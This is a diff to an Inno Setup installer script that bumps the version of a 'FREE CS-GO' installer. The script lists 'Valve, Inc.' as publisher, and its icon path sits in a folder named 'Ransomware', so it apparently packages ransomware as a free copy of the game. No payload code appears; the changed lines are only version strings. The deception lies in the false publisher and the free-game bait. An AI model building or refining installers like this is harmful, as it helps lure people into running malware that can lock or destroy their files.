@@ -2,7 +2,7 @@
 ; SEE THE DOCUMENTATION FOR DETAILS ON CREATING INNO SETUP SCRIPT FILES!
 
 #define MyAppName "CS-GO GRATUIT"
-#define MyAppVersion "1.5.4"
+#define MyAppVersion "1.5.5"
 #define MyAppPublisher "Valve, Inc."
 #define MyAppURL "http://csgo.com/?__cf_chl_jschl_tk__=pmd_8cSsiNWggLf.Qw4iT0exBmBZ6xKnDGBjm8DUCsrsEds-1631724166-0-gqNtZGzNAdCjcnBszQNl"
 #define MyAppExeName "CSGO-GRATUIT.exe"
@@ -27,7 +27,7 @@ ChangesAssociations=yes
 DisableProgramGroupPage=yes
 ; Uncomment the following line to run in non administrative install mode (install for current user only.)
 ;PrivilegesRequired=lowest
-OutputBaseFilename=FREE CS-GO Setup 1.5.4
+OutputBaseFilename=FREE CS-GO Setup 1.5.5
 SetupIconFile=D:\Enzo\Documents\Python Scripts\Ransomware\InnoSetup\setup_ico.ico
 Compression=lzma
 SolidCompression=yes
